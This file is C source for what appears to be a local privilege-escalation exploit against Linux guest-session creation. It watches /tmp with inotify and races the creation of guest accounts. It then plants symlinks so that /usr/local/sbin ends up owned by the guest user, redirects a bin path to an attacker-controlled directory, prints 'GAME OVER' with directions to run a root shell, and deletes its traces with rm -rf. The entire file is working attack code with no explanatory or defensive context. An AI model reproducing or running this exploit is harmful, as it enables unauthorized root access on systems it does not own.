#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <pwd.h>
#define EVENT_SIZE (sizeof(struct inotify_event))
#define EVENT_BUF_LEN (1024 * (EVENT_SIZE + 16))
int main(void) {
  struct stat info;
  struct passwd * pw;
  struct inotify_event * event;
  pw = getpwnam("root");
  if (pw == NULL) exit(0);
  char newpath[20] = "old.";
  int length = 0, i, fd, wd, count1 = 0, count2 = 0;
  int a, b, c;
  char buffer[EVENT_BUF_LEN];
  fd = inotify_init();
  if (fd < 0) exit(0);
  wd = inotify_add_watch(fd, "/tmp/", IN_CREATE | IN_MOVED_FROM);
  if (wd < 0) exit(0);
  chdir("/tmp/");
  while (1) {
    length = read(fd, buffer, EVENT_BUF_LEN);
    if (length > 0) {
      event = (struct inotify_event * ) buffer;
      if (event -> len) {
        if (strstr(event -> name, "guest-") != NULL) {
          for (i = 0; event -> name[i] != '\0'; i++) {
            event -> name[i] = tolower(event -> name[i]);
          }
          if (event -> mask & IN_CREATE) mkdir(event -> name, ACCESSPERMS);
          if (event -> mask & IN_MOVED_FROM) {
            rename(event -> name, strncat(newpath, event -> name, 15));
            symlink("/usr/local/sbin/", event -> name);
            while (1) {
              count1 = count1 + 1;
              pw = getpwnam(event -> name);
              if (pw != NULL) break;
            }
            while (1) {
              count2 = count2 + 1;
              stat("/usr/local/sbin/", & info);
              if (info.st_uid == pw -> pw_uid) {
                a = unlink(event -> name);
                b = mkdir(event -> name, ACCESSPERMS);
                c = symlink("/var/tmp/kodek/bin/", strncat(event -> name,"/bin", 5));
                if (a == 0 && b == 0 && c == 0) {
                  printf("\n[!] GAME OVER !!!\n[!] count1: %i count2:%i\n[!] w8 1 minute and run /bin/subash\n", count1, count2);
                } else {
                  printf("\n[!] a: %i b: %i c: %i\n[!] exploit failed!!!\n[!] w8 1 minute and run it again\n", a, b, c);
                }
                system("/bin/rm -rf /tmp/old.*");
                inotify_rm_watch(fd, wd);
                close(fd);
                exit(0);
              }
            }
          }
        }
      }
    }
  }
}
